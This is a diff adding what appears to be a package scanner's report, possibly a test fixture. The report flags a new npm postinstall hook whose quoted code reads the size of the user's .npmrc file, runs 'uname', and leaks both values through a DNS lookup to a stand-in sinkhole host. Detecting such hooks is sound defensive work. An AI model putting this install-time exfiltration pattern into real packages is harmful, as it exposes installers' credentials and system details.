@@ -1,0 +1,18 @@
+capability_added CAPABILITY_FS_SENSITIVE_READ EXEC_CONTEXT_INSTALL confidence=0.70
+  evidence: setup.js:16 length = fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf8').length;
+  attrs: detail=npm: .npmrc reached_from=scripts.postinstall uses_in_file=1
+capability_added CAPABILITY_NETWORK EXEC_CONTEXT_INSTALL confidence=0.50
+  evidence: setup.js:21 dns.lookup(kernel + '-' + length + '.sinkhole.invalid', () => {});
+  attrs: detail=dns.lookup reached_from=scripts.postinstall uses_in_file=2
+capability_added CAPABILITY_PROCESS_SPAWN EXEC_CONTEXT_INSTALL confidence=0.60
+  evidence: setup.js:20 const kernel = execSync('uname').toString().trim().toLowerCase();
+  attrs: detail=child_process.execSync reached_from=scripts.postinstall uses_in_file=2
+file_added CAPABILITY_UNSPECIFIED EXEC_CONTEXT_INSTALL confidence=0.80
+  evidence: setup.js:0 
+  attrs: run_by_install_hook=true sha256=501f678ef480e6a2c399673d68f71e525130a4ea6fbb7fba29f6d79d69911ed5 size=822
+install_hook_added CAPABILITY_INSTALL_HOOK EXEC_CONTEXT_INSTALL confidence=0.90
+  evidence: package.json:7 "postinstall": "node setup.js"
+  attrs: hook=postinstall script=node setup.js
+notes:
+  tarball-vs-repo diff skipped: no source checkout for either version
+
